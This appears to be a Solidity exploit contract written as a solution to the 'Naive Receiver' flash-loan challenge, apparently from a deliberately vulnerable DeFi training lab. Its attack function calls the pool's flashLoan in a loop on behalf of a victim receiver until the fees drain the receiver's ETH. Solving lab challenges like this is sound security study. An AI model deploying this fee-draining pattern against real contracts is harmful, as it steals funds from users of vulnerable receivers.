// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function ETH() external pure returns (address);
    function flashFee(address token, uint256) external pure returns (uint256);
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external;
}

contract NaiveReceiverAttacker {

    INaiveReceiverLenderPool private pool;
    IERC3156FlashBorrower private receiver;

    constructor(address _pool, address _receiver) {
        pool = INaiveReceiverLenderPool(_pool);
        receiver = IERC3156FlashBorrower(_receiver);
    }

    function attack() public {
        address token = pool.ETH();
        uint256 fee = pool.flashFee(token, 0);        
        uint256 amount = 1 ether; //could be anything - max: 1000 ether

        while (address(receiver).balance >= fee) {
            pool.flashLoan(receiver, token, amount, bytes(""));
        }
    }
}